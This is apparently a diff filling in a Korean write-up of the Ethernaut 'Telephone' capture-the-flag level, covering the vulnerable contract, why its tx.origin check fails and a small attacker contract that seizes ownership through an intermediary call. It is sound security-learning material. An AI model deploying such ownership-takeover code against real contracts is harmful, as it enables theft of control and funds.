@@ -376,7 +376,7 @@ await contract.consecutiveWins()
 
 ### 문제 요약
 
-작성 예정.
+컨트랙트의 `owner`를 내 주소로 바꾸면 클리어된다. 직접 호출하면 실패하고, 중간 컨트랙트를 거쳐 호출해야 한다.
 
 ### 핵심
 
@@ -384,19 +384,91 @@ await contract.consecutiveWins()
 - `msg.sender`
 - 피싱형 호출 구조
 
+### 소스 코드
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Telephone {
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function changeOwner(address _owner) public {
+        if (tx.origin != msg.sender) {
+            owner = _owner;
+        }
+    }
+}
+```
+
 ### 풀이
 
-작성 예정.
+취약한 부분은 `changeOwner()`의 조건문이다.
+
+```solidity
+if (tx.origin != msg.sender) {
+    owner = _owner;
+}
+```
+
+EOA가 직접 `changeOwner()`를 호출하면 다음처럼 된다.
+
+- `tx.origin`: 내 지갑 주소
+- `msg.sender`: 내 지갑 주소
+
+둘이 같으므로 조건을 통과하지 못한다.
+
+하지만 공격 컨트랙트를 거쳐 호출하면 값이 달라진다.
+
+- `tx.origin`: 내 지갑 주소
+- `msg.sender`: 공격 컨트랙트 주소
+
+이제 `tx.origin != msg.sender`가 참이 되고, `owner`를 내가 원하는 주소로 바꿀 수 있다.
 
 ### 공격 코드
 
 ```solidity
-// 작성 예정
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface ITelephone {
+    function changeOwner(address _owner) external;
+}
+
+contract TelephoneAttack {
+    ITelephone private immutable target;
+
+    constructor(address targetAddress) {
+        target = ITelephone(targetAddress);
+    }
+
+    function attack(address newOwner) external {
+        target.changeOwner(newOwner);
+    }
+}
 ```
+
+배포할 때 `targetAddress`에는 Ethernaut 인스턴스 주소를 넣는다.
+
+```javascript
+contract.address
+```
+
+배포 후 공격 컨트랙트의 `attack()`에 내 지갑 주소를 넣고 실행한다.
+
+```javascript
+await contract.owner()
+```
+
+`owner`가 내 주소로 바뀌었으면 인스턴스를 제출하면 된다.
 
 ### 정리
 
-작성 예정.
+권한 검증에 `tx.origin`을 쓰면 중간 컨트랙트 호출에 취약하다. 인증과 권한 확인은 보통 `msg.sender` 기준으로 해야 한다.
 
 </section>
 <section class="ethernaut-page" data-ethernaut-page data-level-title="Token" markdown="1">
